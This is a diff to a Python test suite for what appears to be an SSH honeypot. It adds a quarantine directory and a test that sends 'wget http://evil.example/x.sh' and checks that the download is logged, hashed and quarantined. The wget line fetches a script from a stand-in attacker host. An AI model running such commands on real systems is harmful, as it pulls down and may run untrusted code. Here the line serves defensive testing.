@@ -13,7 +13,8 @@ def run_client(tmp_path, port, password, command=None):
         out = None
         server = await start_server(port=port, key_path=str(tmp_path / "key"),
                                     db_path=str(db_path),
-                                    log_path=str(tmp_path / "e.jsonl"))
+                                    log_path=str(tmp_path / "e.jsonl"),
+                                    quarantine_path=str(tmp_path / "quarantine"))
         try:
             async with asyncssh.connect("127.0.0.1", port, username="root",
                                         password=password, known_hosts=None) as conn:
@@ -34,6 +35,16 @@ def test_bad_password(tmp_path):
     auth = Storage(db_path).get_events(event_type="auth")
     assert auth[0]["payload"]["password"] == "zzz"
     assert auth[0]["payload"]["success"] is False
+
+
+def test_download_event(tmp_path):
+    db_path, out = run_client(tmp_path, 2296, "123456",
+                              "wget http://evil.example/x.sh")
+    assert "x.sh saved" in out
+    dl = Storage(db_path).get_events(event_type="download")
+    assert dl[0]["payload"]["url"] == "http://evil.example/x.sh"
+    assert len(dl[0]["payload"]["sha256"]) == 64
+    assert list((tmp_path / "quarantine").glob("*_x.sh"))
 
 
 def test_login_and_command(tmp_path):
